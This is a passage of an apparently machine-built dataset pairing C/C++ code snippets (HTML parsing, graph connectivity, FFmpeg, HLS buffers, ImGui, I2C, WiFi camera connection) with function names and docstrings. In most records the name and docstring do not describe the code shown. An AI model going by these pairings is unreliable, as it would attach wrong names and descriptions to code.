j++;\\n           A[j].B[0].num=0;\\n        }\\n    }\\n}'}","id":3333}
{"content":"{'function_name': 'ParseMainPage', 'docstring': '\/\/\u4fdd\u5b58\u7b5b\u9009\u7ed3\u679c\u7684\u53d8\u91cf', 'code': 'void ParseDetailPage(const string&html,string*content){\\n\/\/\u57fa\u4e8e\u5b57\u7b26\u4e32\u67e5\u627e\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u89e3\u6790\\n\/\/\u4e3b\u8981\u662f\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u5f88\u65b9\u4fbf\\n\/\/\u627e\u5230\u6b63\u6587\u7684\u5f00\u59cb\u4f4d\u7f6e\u548c\u7ed3\u675f\u4f4d\u7f6e\uff0c\u7136\u540e\u53bb\u53d6\u5b57\u7b26\u4e32\u5b57\u4e32\u5373\u53ef\\n\\tstring beg_flag=\"<div class=\\\\\"panel-body content-body content-ext\\\\\">\";\\n\\tsize_t beg=html.find(beg_flag);\\n\\tif(beg==string::npos){\\n\\t\\tfprintf(stderr,\"\u627e\u4e0d\u5230\u5f00\u59cb\u6807\u8bb0!\\\\n\");\\n\\t\\treturn ;\\n\\t}\\n\\tbeg+=beg_flag.size();\\n\\n\\tstring end_flag=\"<script>_drgd200();<\/script>\";\\n\\tsize_t end=html.find(end_flag);\\n\\tif(end==string::npos){\\n\\t\\t\\tfprintf(stderr,\"\u627e\u4e0d\u5230\u7ed3\u675f\u6807\u8bb0!\\\\n\");\\n\\t\\t\\treturn ;\\n\\t}\\n\\tif(beg>=end){\\n\\t\\tfprintf(stderr,\"\u5f00\u59cb\u7ed3\u675f\u6807\u5fd7\u6709\u95ee\u9898\uff01beg = %lu\uff0cend = %lu\\\\n\",beg,end);\\n\\t\\treturn ;\\n\\t}\\n\\t*content=html.substr(beg,end-beg);\\n\\t\/\/\u66ff\u6362\u6389\u8f6c\u4e49\u5b57\u7b26\\n\\tboost::algorithm::replace_all(*content,\"&nbsp;\",\" \");\\n\\tboost::algorithm::replace_all(*content,\"<br \/>\",\"\\\\n\");\\n}'}","id":3334}
{"content":"{'function_name': 'is_comment', 'docstring': '\/\/ consider empty line as a comment', 'code': 'inline bool IsFrac(double x)\\n{\\n  double f;\\n  f = ceil(x - MY_EPS) - x;\\n  if (f < MY_EPS)\\n    return (false);\\n  if (f > 1.0 - MY_EPS)\\n    return (false);\\n  return (true); \/\/    eps  <= ceil(x)-x <= 1-eps\\n}'}","id":3335}
{"content":"{'function_name': 'DFSUtil', 'docstring': '\/\/ Recur all the vertices adjacent to this vertex', 'code': 'bool isConnected()\\n{\\n    \/\/ Mark all the vertices as not visited\\n    bool visited[N];\\n    int i;\\n    for(i = 0; i < N; i++)\\n        visited[i] = false;\\n\\n    \/\/ Find a vertex with non-zero degree\\n    for(i = 0; i<N; i++)\\n        if(adj[i].size()!=0)\\n            break;\\n    \/\/ If there are no edges in the graph, return true\\n    if(i == N)\\n        return true;\\n\\n    \/\/ Start DFS traversal from a vertex with non-zero degree\\n    DFSUtil(i, visited);\\n\\n    \/\/ Check if all non-zero degree vertices are visited\\n    for(i = 0; i < N; i++)\\n        if(visited[i] == false && adj[i].size() > 0)\\n            return false;\\n    return true;\\n}'}","id":3337}
{"content":"{'function_name': 'denoiseb_rd31_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd32_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd32 read pattern: { denoiseb_update_0[d0, d1] -> raw[2d0, d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1931 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_1931();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3340}
{"content":"{'function_name': 'generate_sv_package_header', 'docstring': '\/\/ end of guard', 'code': 'void fix_verilog_ln(Generator* generator, uint32_t offset) {\\n    \/\/ need to fix every variable and statement verilog line number by an offset\\n    if (!generator->debug) return;\\n    \/\/ fix the variable declaration\\n    generator->verilog_ln += offset;\\n    auto const& var_names = generator->get_all_var_names();\\n    for (auto const& var_name : var_names) {\\n        auto var = generator->get_var(var_name);\\n        var->verilog_ln += offset;\\n    }\\n    \/\/ get all the statement graph\\n    StatementGraph graph(generator);\\n    auto stmts = graph.nodes();\\n    for (auto const& iter : stmts) {\\n        auto* stmt = iter.first;\\n        stmt->verilog_ln += offset;\\n    }\\n}'}","id":3342}
{"content":"{'function_name': 'calc_Chisquare', 'docstring': '\/\/ size_t size = matrix.size();', 'code': 'double calc_Split(vector<vector<double>>& matrix) {\\n    vector<double> attrSum;\\n    vector<double> clsSum;\\n    double allSum;\\n    getSumRowCol(matrix, attrSum, clsSum, allSum);\\n    \/\/ size_t size = matrix.size();\\n    double ret = 0;\\n    for (size_t i = 0; i < attrSum.size(); i++) {\\n        if (attrSum[i] > 0) {\\n            double num = attrSum[i] \/ allSum;\\n            ret += (-num * log2(num));\\n        }\\n    }\\n    return ret;\\n}'}","id":3346}
{"content":"{'function_name': 'icvCloseAVI_FFMPEG', 'docstring': '\/\/cvFree( (void**)&(capture->entries) );\\r', 'code': 'static int icvOpenAVI_FFMPEG( CvCaptureAVI_FFMPEG* capture, const char* filename )\\r\\n{\\r\\n    int err, valid = 0, video_index = -1, i;\\r\\n    AVFormatContext *ic;\\r\\n\\r\\n    capture->ic = NULL;\\r\\n    capture->video_stream = -1;\\r\\n    capture->video_st = NULL;\\r\\n    \/* register all codecs, demux and protocols *\/\\r\\n    av_register_all();\\r\\n\\r\\n    err = av_open_input_file(&ic, filename, NULL, 0, NULL);\\r\\n    if (err < 0) {\\r\\n\\t    CV_WARN(\"Error opening file\");\\r\\n\\t    goto exit_func;\\r\\n    }\\r\\n    capture->ic = ic;\\r\\n    err = av_find_stream_info(ic);\\r\\n    if (err < 0) {\\r\\n\\t    CV_WARN(\"Could not find codec parameters\");\\r\\n\\t    goto exit_func;\\r\\n    }\\r\\n    for(i = 0; i < ic->nb_streams; i++) {\\r\\n#if LIBAVFORMAT_BUILD > 4628\\r\\n        AVCodecContext *enc = ic->streams[i]->codec;\\r\\n#else\\r\\n        AVCodecContext *enc = &ic->streams[i]->codec;\\r\\n#endif\\r\\n        AVCodec *codec;\\r\\n    if( CODEC_TYPE_VIDEO == enc->codec_type && video_index < 0) {\\r\\n        video_index = i;\\r\\n        codec = avcodec_find_decoder(enc->codec_id);\\r\\n        if (!codec ||\\r\\n        avcodec_open(enc, codec) < 0)\\r\\n        goto exit_func;\\r\\n        capture->video_stream = i;\\r\\n        capture->video_st = ic->streams[i];\\r\\n        capture->picture = avcodec_alloc_frame();\\r\\n\\r\\n        capture->rgb_picture.data[0] = (uchar*)cvAlloc(\\r\\n                                avpicture_get_size( PIX_FMT_BGR24,\\r\\n                                enc->width, enc->height ));\\r\\n        avpicture_fill( (AVPicture*)&capture->rgb_picture, capture->rgb_picture.data[0],\\r\\n                PIX_FMT_BGR24, enc->width, enc->height );\\r\\n\\r\\n        cvInitImageHeader( &capture->frame, cvSize( enc->width,\\r\\n                                   enc->height ), 8, 3, 0, 4 );\\r\\n        cvSetData( &capture->frame, capture->rgb_picture.data[0],\\r\\n                           capture->rgb_picture.linesize[0] );\\r\\n        break;\\r\\n    }\\r\\n    }\\r\\n\\r\\n\\r\\n    if(video_index >= 0)\\r\\n    valid = 1;\\r\\n\\r\\nexit_func:\\r\\n\\r\\n    if( !valid )\\r\\n        icvCloseAVI_FFMPEG( capture );\\r\\n\\r\\n    return valid;\\r\\n}'}","id":3348}
{"content":"{'function_name': 'inSliderBehaviorStepperT', 'docstring': '\/\/ Process interacting with the slider', 'code': 'inline bool inSliderBehaviorStepper(const ImRect& bb, ImGuiID id, ImGuiDataType data_type, void* p_v, const void* p_min, const void* p_max, const void* p_step, const char* format, ImGuiSliderFlags flags, ImRect* out_grab_bb)\\n{\\n\\t\/\/ Those MIN\/MAX values are not define because we need to point to them\\n\\tstatic const signed char    IM_S8_MIN = -128;\\n\\tstatic const signed char    IM_S8_MAX = 127;\\n\\tstatic const unsigned char  IM_U8_MIN = 0;\\n\\tstatic const unsigned char  IM_U8_MAX = 0xFF;\\n\\tstatic const signed short   IM_S16_MIN = -32768;\\n\\tstatic const signed short   IM_S16_MAX = 32767;\\n\\tstatic const unsigned short IM_U16_MIN = 0;\\n\\tstatic const unsigned short IM_U16_MAX = 0xFFFF;\\n\\tstatic const ImS32          IM_S32_MIN = INT_MIN;    \/\/ (-2147483647 - 1), (0x80000000);\\n\\tstatic const ImS32          IM_S32_MAX = INT_MAX;    \/\/ (2147483647), (0x7FFFFFFF)\\n\\tstatic const ImU32          IM_U32_MIN = 0;\\n\\tstatic const ImU32          IM_U32_MAX = UINT_MAX;   \/\/ (0xFFFFFFFF)\\n#ifdef LLONG_MIN\\n\\tstatic const ImS64          IM_S64_MIN = LLONG_MIN;  \/\/ (-9223372036854775807ll - 1ll);\\n\\tstatic const ImS64          IM_S64_MAX = LLONG_MAX;  \/\/ (9223372036854775807ll);\\n#else\\n\\tstatic const ImS64          IM_S64_MIN = -9223372036854775807LL - 1;\\n\\tstatic const ImS64          IM_S64_MAX = 9223372036854775807LL;\\n#endif\\n\\tstatic const ImU64          IM_U64_MIN = 0;\\n#ifdef ULLONG_MAX\\n\\tstatic const ImU64          IM_U64_MAX = ULLONG_MAX; \/\/ (0xFFFFFFFFFFFFFFFFull);\\n#else\\n\\tstatic const ImU64          IM_U64_MAX = (2ULL * 9223372036854775807LL + 1);\\n#endif\\n\\n\\t\/\/ Read imgui.cpp \"API BREAKING CHANGES\" section for 1.78 if you hit this assert.\\n\\tIM_ASSERT((flags == 1 || (flags & ImGuiSliderFlags_InvalidMask_) == 0) && \"Invalid ImGuiSliderFlags flag!  Has the \\'float power\\' argument been mistakenly cast to flags? Call function with ImGuiSliderFlags_Logarithmic flags instead.\");\\n\\n\\tImGuiContext& g = *GImGui;\\n\\tif ((g.CurrentItemFlags & ImGuiItemFlags_ReadOnly) || (flags & ImGuiSliderFlags_ReadOnly))\\n\\t\\treturn false;\\n\\n\\tswitch (data_type)\\n\\t{\\n\\tcase ImGuiDataType_S8: { ImS32 v32 = (ImS32) * (ImS8*)p_v;  bool r = inSliderBehaviorStepperT<ImS32, ImS32, float>(bb, id, ImGuiDataType_S32, &v32, *(const ImS8*)p_min, *(const ImS8*)p_max, *(const ImS8*)p_step, format, flags, out_grab_bb); if (r) *(ImS8*)p_v = (ImS8)v32;  return r; }\\n\\tcase ImGuiDataType_U8: { ImU32 v32 = (ImU32) * (ImU8*)p_v;  bool r = inSliderBehaviorStepperT<ImU32, ImS32, float>(bb, id, ImGuiDataType_U32, &v32, *(const ImU8*)p_min, *(const ImU8*)p_max, *(const ImU8*)p_step, format, flags, out_grab_bb); if (r) *(ImU8*)p_v = (ImU8)v32;  return r; }\\n\\tcase ImGuiDataType_S16: { ImS32 v32 = (ImS32) * (ImS16*)p_v; bool r = inSliderBehaviorStepperT<ImS32, ImS32, float>(bb, id, ImGuiDataType_S32, &v32, *(const ImS16*)p_min, *(const ImS16*)p_max, *(const ImS16*)p_step, format, flags, out_grab_bb); if (r) *(ImS16*)p_v = (ImS16)v32; return r; }\\n\\tcase ImGuiDataType_U16: { ImU32 v32 = (ImU32) * (ImU16*)p_v; bool r = inSliderBehaviorStepperT<ImU32, ImS32, float>(bb, id, ImGuiDataType_U32, &v32, *(const ImU16*)p_min, *(const ImU16*)p_max, *(const ImU16*)p_step, format, flags, out_grab_bb); if (r) *(ImU16*)p_v = (ImU16)v32; return r; }\\n\\tcase ImGuiDataType_S32:\\n\\t\\tIM_ASSERT(*(const ImS32*)p_min >= IM_S32_MIN \/ 2 && *(const ImS32*)p_max <= IM_S32_MAX \/ 2);\\n\\t\\treturn inSliderBehaviorStepperT<ImS32, ImS32, float >(bb, id, data_type, (ImS32*)p_v, *(const ImS32*)p_min, *(const ImS32*)p_max, *(const ImS32*)p_step, format, flags, out_grab_bb);\\n\\tcase ImGuiDataType_U32:\\n\\t\\tIM_ASSERT(*(const ImU32*)p_max <= IM_U32_MAX \/ 2);\\n\\t\\treturn inSliderBehaviorStepperT<ImU32, ImS32, float >(bb, id, data_type, (ImU32*)p_v, *(const ImU32*)p_min, *(const ImU32*)p_max, *(const ImU32*)p_step, format, flags, out_grab_bb);\\n\\tcase ImGuiDataType_S64:\\n\\t\\tIM_ASSERT(*(const ImS64*)p_min >= IM_S64_MIN \/ 2 && *(const ImS64*)p_max <= IM_S64_MAX \/ 2);\\n\\t\\treturn inSliderBehaviorStepperT<ImS64, ImS64, double>(bb, id, data_type, (ImS64*)p_v, *(const ImS64*)p_min, *(const ImS64*)p_max, *(const ImS64*)p_step, format, flags, out_grab_bb);\\n\\tcase ImGuiDataType_U64:\\n\\t\\tIM_ASSERT(*(const ImU64*)p_max <= IM_U64_MAX \/ 2);\\n\\t\\treturn inSliderBehaviorStepperT<ImU64, ImS64, double>(bb, id, data_type, (ImU64*)p_v, *(const ImU64*)p_min, *(const ImU64*)p_max, *(const ImU64*)p_step, format, flags, out_grab_bb);\\n\\tcase ImGuiDataType_Float:\\n\\t\\tIM_ASSERT(*(const float*)p_min >= -FLT_MAX \/ 2.0f && *(const float*)p_max <= FLT_MAX \/ 2.0f);\\n\\t\\treturn inSliderBehaviorStepperT<float, float, float >(bb, id, data_type, (float*)p_v, *(const float*)p_min, *(const float*)p_max, *(const float*)p_step, format, flags, out_grab_bb);\\n\\tcase ImGuiDataType_Double:\\n\\t\\tIM_ASSERT(*(const double*)p_min >= -DBL_MAX \/ 2.0f && *(const double*)p_max <= DBL_MAX \/ 2.0f);\\n\\t\\treturn inSliderBehaviorStepperT<double, double, double>(bb, id, data_type, (double*)p_v, *(const double*)p_min, *(const double*)p_max, *(const double*)p_step, format, flags, out_grab_bb);\\n\\tcase ImGuiDataType_COUNT: break;\\n\\t}\\n\\tIM_ASSERT(0);\\n\\treturn false;\\n}'}","id":3352}
{"content":"{'function_name': 'HrCopyBlob', 'docstring': '\/\/ Done\\r', 'code': 'IMSGPRIORITY PriorityFromStringA(LPCSTR pszPriority)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    IMSGPRIORITY priority=IMSG_PRI_NORMAL;\\r\\n    DWORD        dwPriority;\\r\\n\\r\\n    \/\/ If IsDigit...\\r\\n    if (IsDigit((LPSTR)pszPriority))\\r\\n    {\\r\\n        \/\/ Convert\\r\\n        dwPriority = (DWORD)StrToInt(pszPriority);\\r\\n\\r\\n        \/\/ Map to pri type\\r\\n        if (dwPriority <= 2)\\r\\n            priority = IMSG_PRI_HIGH;\\r\\n        else if (dwPriority > 3)\\r\\n            priority = IMSG_PRI_LOW;\\r\\n    }\\r\\n\\r\\n    \/\/ Otheriwse, map from high, normal and low...\\r\\n    else\\r\\n    {\\r\\n        \/\/ High, Highest, Low, Lowest\\r\\n        if (lstrcmpi(pszPriority, STR_PRI_MS_HIGH) == 0)\\r\\n            priority = IMSG_PRI_HIGH;\\r\\n        else if (lstrcmpi(pszPriority, STR_PRI_MS_LOW) == 0)\\r\\n            priority = IMSG_PRI_LOW;\\r\\n        else if (lstrcmpi(pszPriority, STR_PRI_HIGHEST) == 0)\\r\\n            priority = IMSG_PRI_HIGH;\\r\\n        else if (lstrcmpi(pszPriority, STR_PRI_LOWEST) == 0)\\r\\n            priority = IMSG_PRI_LOW;\\r\\n    }\\r\\n\\r\\n    \/\/ Done\\r\\n    return priority;\\r\\n}'}","id":3355}
{"content":"{'function_name': 'demosaic_bx_rd0_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_bx_rd1_select(demosaic_bxb_cache& demosaic_bxb, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_bx_rd1 read pattern: { demosaic_bx_update_0[d0, d1] -> demosaic_bxb[1 + 2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaic_bx_update_0[d0, d1] -> [3 + d1, 3 + d0, 7] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { demosaic_bxb_update_0[d0, d1] -> [3 + d1, 3 + d0, 6] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_bxb_demosaic_bxb_update_0_write1 = demosaic_bxb.demosaic_bxb_demosaic_bxb_update_0_write1_merged_banks_1.peek(\/* one reader or all rams *\/ 0);\\n  return value_demosaic_bxb_demosaic_bxb_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3359}
{"content":"{'function_name': 'GetAllPathEndPoint', 'docstring': '\/\/ \u5982\u679c\u6ca1\u6709\u8def\u5f84\u8fd4\u56deFALSE', 'code': 'BOOL IsRemainLoopValid( CSmartLoop *pReLoop, JDNC_TOL &cTol, double dTol ) \\n{\\n\\t\/\/ \u5982\u679c\u6709\u5c9b,\u6709\u6548,\u8fd4\u56de\\n\\tif( pReLoop->m_pIsland ) return TRUE ;\\n\\n\\t\/\/ \u5982\u679c\u6ca1\u6709\u7a7a\u7ebf\u6bb5\u8fd4\u56de\\n\\tBOOL bFind = FALSE ;\\n\\tCSmartSect *pHead = pReLoop->m_pCurve->GetHead () ;\\n\\tfor( ; pHead ; pHead = pHead->next )\\n\\t{\\n\\t\\tif( pHead->m_bEndFlag & NC_BLANK_SECT )\\n\\t\\t{\\n\\t\\t\\tbFind = TRUE ;\\n\\t\\t\\tbreak ;\\n\\t\\t}\\n\\t}\\n\\tif( !bFind ) return TRUE ;\\n\\n\\t\/\/ \u8ba1\u7b97UnBlank\u548cBlank\u4e4b\u95f4\u6700\u5c0f\u8ddd\u79bb\u7684\u6700\u5927\u503c\\n\\tpHead = pReLoop->m_pCurve->GetHead () ;\\n\\tfor( ; pHead ; pHead = pHead->next )\\n\\t{\\n\\t\\tif( pHead->m_bEndFlag & NC_BLANK_SECT ) \\n\\t\\t{\\n\\t\\t\\t\/\/\u8ba1\u7b97blank\u7ebf\u6bb5\u5230unblank\u7ebf\u6bb5\\n\\t\\t\\tif( BlankSectDistLoop( pReLoop, pHead,cTol, dTol ) )\\n\\t\\t\\t{\\n\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\t\/\/ \u8ba1\u7b97unblank\u7ebf\u6bb5\u5230blank\u7ebf\u6bb5\\n\\t\\t\\tif( UnBlankSectDistLoop( pReLoop, pHead, cTol, dTol ) )\\n\\t\\t\\t{\\n\\t\\t\\t\\treturn TRUE ;\\n\\t\\t\\t}\\n\\t\\t}\\n\\t}\\n\\t\\n\\treturn FALSE ;\\n}'}","id":3360}
{"content":"{'function_name': 'SampledGauss_MLE_Cost', 'docstring': '\/\/ Set infinitesimals of constant parameters to zero', 'code': 'T cost_function( const T& xpos, const T& ypos, const T& A, const T& BG, const T& q_1) const\\n    {\\n        T* xVals = new T[I_.nCols];\\n        T* yVals = new T[I_.nRows];\\n        \\n        \/\/ Here we make use of the fact that the gaussian is seperable\\n        for(unsigned int iCol = 0; iCol<I_.nCols; ++iCol)\\n            xVals[iCol] = exp( -(xpos-T(x_[iCol]))*(xpos-T(x_[iCol]))*q_1 );\\n        for(unsigned int iRow = 0; iRow<I_.nRows; ++iRow)\\n            yVals[iRow] = exp( -(ypos-T(y_[iRow]))*(ypos-T(y_[iRow]))*q_1 );\\n        \\n        T cost(0.0);\\n        T model_val(0.0);\\n        \\n        \/\/ Cap background at minimum \\n        T BG_cp;\\n        if( BG < T(0.01) )\\n            BG_cp = T(0.01);\\n        else\\n            BG_cp = BG;\\n        \\n        for(unsigned int iCol = 0; iCol<I_.nCols; ++iCol)\\n            for(unsigned int iRow = 0; iRow<I_.nRows; ++iRow)\\n            {\\n                model_val = A*xVals[iCol]*yVals[iRow] + BG_cp;\\n                cost -= I_(iRow,iCol) * log(model_val) - model_val;\\n            }\\n        \\n        delete[] xVals;\\n        delete[] yVals;\\n        \\n        return cost;\\n    }'}","id":3366}
{"content":"{'function_name': 'main', 'docstring': '\/\/final sorted output file name\\r', 'code': 'line wordtostruct(string str1)  \/\/this function converts the fetched record string into struct variable\\r\\n{\\r\\n        istringstream sss(str1);    \/\/streaming the word\\r\\n        string word;\\r\\n        sss>>word;\\r\\n\\r\\n        stringstream s(word);\\r\\n        int idd = 0;\\r\\n        s>>idd; \/\/fetching id value from the record\\r\\n\\r\\n        sss>>word;\\r\\n        stringstream sls(word);\\r\\n        int saa = 0;    \/\/then sales amount\\r\\n        sls>>saa;\\r\\n\\r\\n        sss>>word;\\r\\n        string cn = word;   \/\/then customer name\\r\\n\\r\\n        sss>>word;\\r\\n        stringstream sct(word); \/\/then category\\r\\n        int catt = 0;\\r\\n        sct>>catt;\\r\\n\\r\\n        line myline = {idd, saa, cn, catt}; \/\/ then storing all into one struct variable\\r\\n        return myline;  \/\/then return the line\\r\\n\\r\\n}'}","id":3369}
{"content":"{'function_name': 'i2cWrite', 'docstring': '\/\/ See: http:\/\/arduino.cc\/en\/Reference\/WireEndTransmission', 'code': 'uint8_t i2cRead(uint8_t registerAddress, uint8_t *data, uint8_t nbytes) {\\n  uint32_t timeOutTimer;\\n  Wire.beginTransmission(IMUAddress);\\n  Wire.write(registerAddress);\\n  uint8_t rcode = Wire.endTransmission(false); \/\/ Don\\'t release the bus\\n  if (rcode) {\\n    Serial.print(F(\"i2cRead failed: \"));\\n    Serial.println(rcode);\\n    return rcode; \/\/ See: http:\/\/arduino.cc\/en\/Reference\/WireEndTransmission\\n  }\\n  Wire.requestFrom(IMUAddress, nbytes, (uint8_t)true); \/\/ Send a repeated start and then release the bus after reading\\n  for (uint8_t i = 0; i < nbytes; i++) {\\n    if (Wire.available())\\n      data[i] = Wire.read();\\n    else {\\n      timeOutTimer = micros();\\n      while (((micros() - timeOutTimer) < I2C_TIMEOUT) && !Wire.available());\\n      if (Wire.available())\\n        data[i] = Wire.read();\\n      else {\\n        Serial.println(F(\"i2cRead timeout\"));\\n        return 5; \/\/ This error value is not already taken by endTransmission\\n      }\\n    }\\n  }\\n  return 0; \/\/ Success\\n}'}","id":3370}
{"content":"{'function_name': 'denoiseb_rd30_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd31_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd31 read pattern: { denoiseb_update_0[d0, d1] -> raw[2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2896 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_2896();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3371}
{"content":"{'function_name': 'drawCosTermCheckbox', 'docstring': '\/\/ TODO Add help here', 'code': 'glm::vec2\\nconvertSampleToCoords(std::size_t i, float value, std::size_t numSamples) {\\n\\t\/\/[0,numSamples) -> [0,180deg]\\n\\tdouble angle = i \/ (double)numSamples * glm::pi<double>();\\n\\treturn {(float)glm::cos(angle) * value, (float)glm::sin(angle) * value};\\n}'}","id":3373}
{"content":"{'function_name': 'extract_airline_test', 'docstring': '\/\/ clang-tidy recommends a raw-string', 'code': 'std::unique_ptr<std::map<std::string, int>> create_frequencies(const std::string &filename) {\\n       auto frequencies = std::make_unique< std::map<std::string, int> >();\\n        \/\/std::map<std::string, int> frequencies;\\n        std::ifstream in(filename);\\n        assert(in.is_open());\\n        std::string line;\\n        in >> line; \/\/ skip first line;\\n        while (in >> line) {\\n            if (line.length() > 40) { \/\/ filter corrupted lines (somehow, in sees space as a new line)\\n                (*frequencies)[extract_airline(line)] += 1;\\n            }\\n        }\\n        in.close();\\n        return frequencies;\\n    }'}","id":3379}
{"content":"{'function_name': 'searchCameraSSID', 'docstring': '\/\/ WiFi.scanNetworks will return the number of networks found', 'code': 'bool connectToCamera(String SSID) {\\n    bool result = true;\\n    short retry = 30;\\n    char ssid[30];\\n    char password[11] = \"1234567890\";\\n \\n    \/\/ String to Char*\\n    SSID.toCharArray(ssid, SSID.length() + 1);\\n \\n    WiFi.begin(ssid, password);\\n    while (WiFi.status() != WL_CONNECTED) {\\n        if (retry == 0) {\\n            result = false;\\n            break;\\n        }\\n        delay(500);\\n        retry--;\\n    }\\n \\n    return result;\\n}'}","id":3391}
{"content":"{'function_name': 'PyCheckBoxWidget', 'docstring': '\/\/ if making a new widget add it at the end', 'code': 'static auto PyImageWidget(PyObject* self, PyObject* args, PyObject* keywds)\\n    -> PyObject* {\\n  BA_PYTHON_TRY;\\n  PyObject* size_obj = Py_None;\\n  PyObject* pos_obj = Py_None;\\n  PyObject* texture_obj = Py_None;\\n  PyObject* tint_texture_obj = Py_None;\\n  ContainerWidget* parent_widget = nullptr;\\n  PyObject* parent_obj = Py_None;\\n  PyObject* edit_obj = Py_None;\\n  PyObject* color_obj = Py_None;\\n  PyObject* tint_color_obj = Py_None;\\n  PyObject* tint2_color_obj = Py_None;\\n  PyObject* opacity_obj = Py_None;\\n  PyObject* mesh_transparent_obj = Py_None;\\n  PyObject* mesh_opaque_obj = Py_None;\\n  PyObject* has_alpha_channel_obj = Py_None;\\n  PyObject* transition_delay_obj = Py_None;\\n  PyObject* draw_controller_obj = Py_None;\\n  PyObject* tilt_scale_obj = Py_None;\\n  PyObject* mask_texture_obj = Py_None;\\n  PyObject* radial_amount_obj = Py_None;\\n\\n  static const char* kwlist[] = {\"edit\",\\n                                 \"parent\",\\n                                 \"size\",\\n                                 \"position\",\\n                                 \"color\",\\n                                 \"texture\",\\n                                 \"opacity\",\\n                                 \"mesh_transparent\",\\n                                 \"mesh_opaque\",\\n                                 \"has_alpha_channel\",\\n                                 \"tint_texture\",\\n                                 \"tint_color\",\\n                                 \"transition_delay\",\\n                                 \"draw_controller\",\\n                                 \"tint2_color\",\\n                                 \"tilt_scale\",\\n                                 \"mask_texture\",\\n                                 \"radial_amount\",\\n                                 nullptr};\\n  if (!PyArg_ParseTupleAndKeywords(\\n          args, keywds, \"|OOOOOOOOOOOOOOOOOO\", const_cast<char**>(kwlist),\\n          &edit_obj, &parent_obj, &size_obj, &pos_obj, &color_obj, &texture_obj,\\n          &opacity_obj, &mesh_transparent_obj, &mesh_opaque_obj,\\n          &has_alpha_channel_obj, &tint_texture_obj, &tint_color_obj,\\n          &transition_delay_obj, &draw_controller_obj, &tint2_color_obj,\\n          &tilt_scale_obj, &mask_texture_obj, &radial_amount_obj))\\n    return nullptr;\\n\\n  if (!g_base->CurrentContext().IsEmpty()) {\\n    throw Exception(\"UI functions must be called with no context set.\");\\n  }\\n\\n  \/\/ Grab the edited widget or create a new one.\\n  Object::Ref<ImageWidget> b;\\n  if (edit_obj != Py_None) {\\n    b = dynamic_cast<ImageWidget*>(UIV1Python::GetPyWidget(edit_obj));\\n    if (!b.Exists())\\n      throw Exception(\"Invalid or nonexistent widget.\",\\n                      PyExcType::kWidgetNotFound);\\n  } else {\\n    parent_widget = parent_obj == Py_None\\n                        ? g_ui_v1->screen_root_widget()\\n                        : dynamic_cast<ContainerWidget*>(\\n                            UIV1Python::GetPyWidget(parent_obj));\\n    if (parent_widget == nullptr) {\\n      throw Exception(\"Parent widget nonexistent or not a container.\",\\n                      PyExcType::kWidgetNotFound);\\n    }\\n    b = Object::New<ImageWidget>();\\n  }\\n  if (size_obj != Py_None) {\\n    Point2D p = Python::GetPyPoint2D(size_obj);\\n    b->set_width(p.x);\\n    b->set_height(p.y);\\n  }\\n  if (texture_obj != Py_None) {\\n    b->SetTexture(&PythonClassUITexture::FromPyObj(texture_obj).texture());\\n  }\\n  if (tint_texture_obj != Py_None) {\\n    b->SetTintTexture(\\n        &PythonClassUITexture::FromPyObj(tint_texture_obj).texture());\\n  }\\n  if (mask_texture_obj != Py_None) {\\n    b->SetMaskTexture(\\n        &PythonClassUITexture::FromPyObj(mask_texture_obj).texture());\\n  }\\n  if 